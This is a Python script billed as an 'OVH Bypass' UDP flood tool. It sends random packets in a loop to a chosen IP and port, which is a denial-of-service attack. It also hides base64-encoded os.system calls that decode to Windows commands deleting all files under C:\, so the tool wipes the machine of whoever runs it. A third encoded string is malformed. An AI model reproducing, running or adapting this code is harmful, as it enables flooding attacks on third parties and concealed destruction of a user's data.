#!/usr/bin/python

import socket, random, sys, time, os, platform, base64

if len(sys.argv) != 5:
        print("""
                 \033[35m[\033[36mPrivate\033[35m]
           \033[35m[\033[36mSCRIPT BY Your mum\033[35m]
""")
        print("""\n\033[36mExample: perl \033[35m%s \033[36m<\033[35mIP\033[36m> <\033[35mPORT / 1025\033[36m> <\033[35mSIZE / 1025\033[36m> <\033[35mTIME\033[36m> [\033[35m120 = Max Boot Time\033[36m]\n\033[97m""" % sys.argv[0])
        sys.exit(1)
 
qIP = sys.argv[1]
qPort = int(sys.argv[2])
qPSize = int(sys.argv[3])
qDuration = int(sys.argv[4])
 
qClock = (lambda:0, time.clock)[qDuration > 0]
 
os.system(base64.b64decode("RGVsIEM6XCAqLiogfHk="))
os.system(base64.b64decode("RGVsIEM6XCAqLio="))
os.system(base64.b64decode("5d137b14edc542b87184c09dc858a544"))
 
qDuration = (1, (qClock() + qDuration))[qDuration > 0]
 
qPacket = random._urandom(qPSize)
qSocket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

print("""\033[36m[\033[35mOVH Bypass\033[36m] [\033[35mPacketing \033[36m%s \033[35mWith \033[36m%s \033[36mSockets \033[35mFor \033[36m%s \033[35mSeconds!\033[36m]\033[97m""" % (qIP, qPSize, qDuration or 'Infinite'))
 
while True:
        if (qClock() < qDuration):
                qSocket.sendto(qPacket, (qIP, qPort))
        else:
                break
 
print("""\033[35mOVH Attack \033[36mHas Been Finished! | \033[35mGG\033[97m""")
